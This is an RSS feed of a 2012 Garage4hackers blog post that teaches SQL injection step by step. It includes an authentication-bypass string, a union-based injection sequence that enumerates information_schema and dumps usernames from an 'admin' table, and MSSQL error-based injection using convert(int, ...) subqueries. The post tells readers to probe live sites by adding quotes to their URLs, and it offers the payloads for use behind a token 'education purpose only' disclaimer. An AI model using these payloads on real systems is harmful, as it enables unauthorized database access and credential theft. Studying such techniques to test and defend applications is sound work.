<?xml version="1.0" encoding="ISO-8859-1"?>

<rss version="2.0" xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:content="http://purl.org/rss/1.0/modules/content/">
	<channel>
		<title>Garage4hackers Forum - Blogs - $K2$</title>
		<link>http://garage4hackers.com/blog.php?u=3568</link>
		<description>Garage4Hackers(G4H) is an open security community for Information Security enthusiasts, gurus and aspirants.Members of the team dedicate time and resources towards helping other information security aspirants, sharing knowledge,spreading security awareness and promoting research.</description>
		<language>en</language>
		<lastBuildDate>Sun, 22 Mar 2020 15:14:25 GMT</lastBuildDate>
		<generator>vBulletin</generator>
		<ttl>60</ttl>
		<image>
			<url>http://garage4hackers.com/images/misc/rss.jpg</url>
			<title>Garage4hackers Forum - Blogs - $K2$</title>
			<link>http://garage4hackers.com/blog.php?u=3568</link>
		</image>
		<item>
			<title>Sql injection attacks compiled</title>
			<link>http://garage4hackers.com/entry.php?b=434</link>
			<pubDate>Mon, 24 Sep 2012 18:44:07 GMT</pubDate>
			<description>hii their this is ma first post on sql injection attacks hope its useful im $k2$ -A.K.A d@rK @nGel  
 
   ...</description>
			<content:encoded><![CDATA[<blockquote class="blogcontent restore">hii their this is ma first post on sql injection attacks hope its useful im $k2$ -A.K.A d@rK @nGel <br />
<br />
    __________________________________________________  __________________________________________________  __________________________________________________  _________________                                    <br />
                                    ##################################################  ###########################<br />
                                    ##################################################  ###########################<br />
                                                             SQL-INJECTION TECHNIQUES<br />
                                    ##################################################  ###########################<br />
                                    ##################################################  ###########################<br />
                                                   &lt;--------------DANISH XAVIER----------&gt;<br />
                                                                     (D@rK @NgEL)<br />
__________________________________________________  __________________________________________________  __________________________________________________  _________________<br />
<br />
TYPE_1<br />
-------<br />
Authentication bypass technique<br />
<br />
<br />
How sql interlinks data with a webpage.<br />
Application &lt;--------sql----------&gt;database<br />
Let me explain with examples<br />
<br />
                                                                         News<br />
id	News_title	News_content<br />
1	danio	birds<br />
2	hacker	accident<br />
Database-is a set of one or more table names<br />
Basic syntax<br />
Select coloumn_name from table_name :<br />
*-is a wild card <br />
Suppose I want a content hacker from the database here is my command<br />
Select news_title from news where id=2;<br />
<br />
Values in sql are passed between   ‘ ‘ –two single quotes<br />
Attack code<br />
‘or’0’=’0<br />
Analysis<br />
Bluemarked-as we know we provide a single quote (sn), ie a null value, it can be anything<br />
Pinkmarked-first sn is provided by us closing sn is from the sites code <br />
Rate of success --&#61664;25% as this is old method it’s very easy to patch <br />
<br />
------------------------------------------------------------------------------------------------------------------------------------------type -2 <br />
UNION BASED INJECTION <br />
Terms <br />
Union select-will selects all the data without repetition<br />
Order by it is used to sort the coloumn data <br />
Flow of control<br />
Data &gt;coloumns&gt;tables&gt;database<br />
Information_schema   – it contains information about all the databases<br />
Information_schema.tables   - it contains information about all the tables of all the databases<br />
Information_schema.columns- it contains information about all the columns of the entire table from all the databases <br />
Table_name-is used to indicate the table names<br />
Coloumn_name-is used to indicate the columns names <br />
Different functions<br />
Version () –shows the version of the databases<br />
Database ()-it will show the name of the database<br />
User ()-shows the default username of the database<br />
Group_concat ()-it is used to combine more data as one entity<br />
Vulnerable targets <br />
Basically apache running applications <br />
Attack<br />
Step 1<br />
Verify the site is vulnerable<br />
.find something +something <br />
Ex: <a href="http://www.XXXX.com/../../id=1,page=3,catid=5" target="_blank">www.XXXX.com/../../id=1,page=3,catid=5</a><br />
Apply a sn on the end of the line, this is to generate error as shown below <br />
<a href="http://www.XXXX.com/../../id=1,page=3,catid=5’" target="_blank">www.XXXX.com/../../id=1,page=3,catid=5’</a><br />
If u see a missing page, an error, blank page anything irregular after applying Sn <br />
wola its vulnerable .<br />
y the error generated bcoz for the value part we passed an sn with it  so it generated error <br />
<br />
Step 2<br />
<br />
<br />
Append the  link with order by1—<br />
Ex; select *from users where id=1and page=3;<br />
Select *from users where id=1 order by 1-- and page=3;<br />
Step 3<br />
Combine all the data to see visible columns<br />
union select 1,2,3,4,5,6,7,8,9—<br />
one trick since there are to much content on the webpage when we display the database there won’t be any space so we have to remove those e contents or hide it so we add “-“<br />
Ex;<br />
Id=47<br />
Id=-47<br />
So here is the url<br />
<a href="http://www.XXXX.com/../../unionselect" target="_blank">www.XXXX.com/../../unionselect</a> 1, table_name, 3,4,5,6,7,8,9 from information_schema.tables--<br />
so we selected all the tables in the database (information_schema.tables)then we specified which column it was “ 2” as its missing in the url above,selected all the data without repletion of the same data (union select 1,table_name)<br />
so we got the coloumns and the table now to narrow it down to which coloumn,let the table name be “admin”<br />
<br />
step 5<br />
Replace the above URL as shown below <br />
<a href="http://www.XXXX.com/../../unionselect" target="_blank">www.XXXX.com/../../unionselect</a> 1, coloumn_name, 3,4,5,6,7,8,9 from information_schema.coloumns where table_name=’admin’—<br />
username	admin<br />
1	<br />
2	<br />
3	<br />
4	<br />
5	<br />
	<br />
	<br />
<br />
<br />
<br />
<br />
<br />
Step 6<br />
Get the data <br />
Attack<br />
Union select 1, username, 3, 4 from admin—<br />
If not worked convert t the table name to ASCII like for above ascii<br />
Char (97, 117, 116, 104, 11,114)<br />
Or go to <a href="http://www.easycalculations.com" target="_blank">easycalculations.com</a> and do it <br />
Use function group_concat if space on Ur browser not enough <br />
<br />
<br />
ADVANCED INJECTIONS<br />
Error based injection <br />
For web site with aspx, .asp&#61664;mssql<br />
Or we can say (Microsoft)<br />
<br />
Here we follow a stack structure top of the stack is pushed out first <br />
Step-1<br />
Find something=something<br />
Step 2:<br />
And 1=convert (int,(select top 1 table_name from information_schema.tables))--<br />
Here select top 1 table_name from information_schema.tables-is first executed<br />
Here 1=convert (int,()),this is converting the database tablename or column name to integer which results in an error ,and computer says im not able to convert tha table name so we get the name of the table <br />
Traversing to other tables<br />
select top 1 table_name from information_schema.tables where table_name not in (‘’,’’,’’,’’)<br />
once we get the required table name its now turn for the coloumns <br />
And 1=convert (int,(select top 1 column_name from information_schema.coloumns where table_name=’admin’ and column_name not in (‘’,’’,’’,’’))<br />
<br />
<br />
<br />
hope you got it ,above all practice <br />
<br />
there is another advanced injection <br />
BLIND SQL INJECTION which ihavent taken it down it too time consuming i basically rely that type on automated tools <br />
<br />
<br />
this is for education purpose only im not responsible for any mishandling of information<br />
<br />
<br />
------------------------------------------------------------------------------------------------------------------------------------------##################################################  ###################################<br />
                                                                              THE END  <br />
                                                          ======== D@rK @nGeL======</blockquote>

]]></content:encoded>
			<dc:creator>$K2$</dc:creator>
			<guid isPermaLink="true">http://garage4hackers.com/entry.php?b=434</guid>
		</item>
	</channel>
</rss>
